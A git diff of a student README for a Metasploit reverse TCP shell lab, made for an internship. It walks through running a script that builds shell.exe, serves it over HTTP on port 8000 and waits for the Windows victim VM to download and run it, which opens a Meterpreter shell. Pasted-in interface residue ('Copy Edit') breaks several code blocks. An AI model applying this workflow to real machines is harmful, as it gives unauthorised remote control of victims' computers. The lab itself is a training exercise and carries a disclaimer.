@@ -1,38 +1,80 @@
 # Metasploit Reverse Shell Lab
 
-A step-by-step reverse shell lab using Metasploit Framework, designed for educational purposes only in a virtual test environment (Kali + Windows 10 VM).
+This project demonstrates how to create a **reverse TCP shell** using the Metasploit Framework in a controlled lab environment (Kali Linux as attacker, Windows 10 as victim).
 
-## 📁 Folder Structure
-
-metasploit-reverse-shell-lab/
-├── scripts/ # run_lab.sh automation script
-├── payloads/ # Generated shell.exe (ignored in Git)
-├── screenshots/ # Images of the shell session
-├── README.md
-└── LICENSE
-
-## ⚙️ How to Use
-
-### 1. On Kali Linux (Attacker):
-
-```bash
-cd scripts
-./run_lab.sh <KALI_IP> 4444
-2. On Windows VM (Victim):
-Open browser and go to:
-
-arduino
-http://<KALI_IP>:8000/shell.exe
-Download and run the file to trigger a Meterpreter session.
-
-✅ Expected Output
-On Kali, you'll get:
-
-nginx
-
-meterpreter > sysinfo
-⚠️ Disclaimer
-This lab is for educational and ethical hacking in a controlled virtual environment only. Do not use this code against unauthorized systems.
+The automation is handled by a single script: `scripts/run_lab.sh`.
 
 ---
 
+## 🛠️ Requirements
+
+- Kali Linux (with Metasploit installed)
+- Windows 10 VM (victim)
+- VirtualBox or VMware
+- Both machines on same LAN / Host-only network
+
+---
+
+## 📂 How to Use
+
+### 1. Clone this repository
+
+```bash
+git clone https://github.com/<your-username>/metasploit-reverse-shell-lab.git
+cd metasploit-reverse-shell-lab/scripts
+2. Make script executable
+bash
+Copy
+Edit
+chmod +x run_lab.sh
+3. Run the script
+bash
+Copy
+Edit
+./run_lab.sh <your-kali-ip> 4444
+Example:
+./run_lab.sh 192.168.1.50 4444
+
+This will:
+
+Generate a reverse shell payload (shell.exe)
+
+Host it over HTTP at http://<ip>:8000/shell.exe
+
+Start a Metasploit handler waiting for the connection
+
+🪟 On the Windows Victim VM
+Open a browser
+
+Visit: http://<kali-ip>:8000/shell.exe
+
+Download and run the file
+
+🐚 If it works…
+You'll see a Meterpreter session open in your Kali terminal:
+
+bash
+Copy
+Edit
+meterpreter > sysinfo
+meterpreter > shell
+⚠️ DISCLAIMER
+This lab is for educational use only in a virtual environment. Do not use this on real systems or networks you don’t have permission to test.
+
+📝 Credits
+Made by Aarya as part of a cybersecurity learning project (ShadowFox Internship Lab – June 2025).
+
+yaml
+Copy
+Edit
+
+---
+
+## ✅ 2. Optional `.gitignore` (optional but safe)
+
+Create a `.gitignore` file with this content:
+
+```bash
+payloads/
+*.exe
+*.log
